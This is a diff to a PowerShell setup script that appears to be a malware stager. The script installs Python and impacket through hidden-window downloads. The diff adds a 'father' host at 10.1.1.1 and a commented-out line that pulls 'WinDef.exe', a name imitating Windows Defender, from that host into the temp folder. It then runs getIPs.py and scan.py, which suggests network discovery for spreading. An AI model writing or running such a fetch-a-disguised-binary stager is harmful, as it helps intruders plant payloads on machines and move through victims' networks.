@@ -1,9 +1,11 @@
+# Setup
+$father = '10.1.1.1'
+$save_dir = $env:temp
+#$save_path = '' + $save_dir + '\' + $filename;
+
 # TODO
 # Add x84 and x64 options
 
-# Setup
-$save_dir = $env:temp
-#$save_path = '' + $save_dir + '\' + $filename;
 
 
 function get_wget {
@@ -45,12 +47,20 @@ python $Location
 python -m pip  install impacket
 
 
+# Download WinDef.exe
+#$Location = '' + $save_dir + '\' + 'WinDef.exe';
+#Start-Process -FilePath $wgetBinLocation -Args " http://$father/WinDef.exe -O $Location" -passthru -NoNewWindow -Wait
+
+
+python getIPs.py
+python scan.py
+
+
+
 #$filename = "wget.exe"
 #$Location = '' + $save_dir + '\' + $filename;
-#Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\2.msi
-" -passthru -NoNewWindow -Wait -WindowStyle hidden
-#Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\3.msi
-" -passthru -NoNewWindow -Wait -WindowStyle hidden
+#Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\2.msi" -passthru -NoNewWindow -Wait -WindowStyle hidden
+#Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\3.msi" -passthru -NoNewWindow -Wait -WindowStyle hidden
 
 #Start-Process -FilePath "msiexec.exe"  -Args "/a $Location /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
 #Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\2.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
